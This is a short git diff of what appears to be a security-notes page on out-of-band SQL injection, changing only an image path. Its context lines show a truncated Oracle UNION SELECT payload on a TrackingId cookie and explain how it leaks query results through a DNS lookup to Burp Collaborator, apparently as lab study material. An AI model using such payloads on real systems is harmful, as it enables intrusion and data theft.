@@ -25,6 +25,6 @@ TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="U
 ```
 
 Here we are triggering DNS Lookup (Catching it with Burp Collaborator) by putting a XML entity into SQL request where are are injecting another SQL request into subdomain\
-![](<../../../.gitbook/assets/image (3).png>)
+![](<../../../.gitbook/assets/image (3) (1).png>)
 
 </details>
